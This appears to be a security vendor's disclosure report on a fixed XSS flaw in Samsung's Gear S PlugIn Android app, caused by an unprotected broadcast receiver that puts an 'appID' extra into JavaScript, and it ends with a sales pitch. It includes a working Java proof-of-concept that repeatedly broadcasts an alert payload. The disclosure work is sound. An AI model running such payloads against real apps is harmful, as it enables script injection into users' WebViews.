# Details

<table>
    <tr>
        <td>Name</td>
        <td>Gear S PlugIn</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.gearoplugin</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.17</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$220</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found in the Gear S PlugIn app in the `com/samsung/android/gearoplugin/pm/webstore/activity/WebStoreWebViewActivity.java` file dynamic registration of an unprotected broadcast receiver. It accepted the `appID` parameter from the attacker, which was insecurely concatenated to JavaScript code, leading to XSS.

**Proof of Concept**

```java
new Thread(() -> {
    Intent i = new Intent("com.samsung.android.gearOPlugin.webviewuicontrol.SET_INSTALLED");
    i.putExtra("appID", "'-alert(1)-'");
    while (true) {
        sendBroadcast(i);
        try {
            Thread.sleep(500);
        } catch (Throwable th) {
            return;
        }
    }
}).start();
```

## References

- [Oversecured Blog. Android security checklist: WebView](https://blog.oversecured.com/Android-security-checklist-webview/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.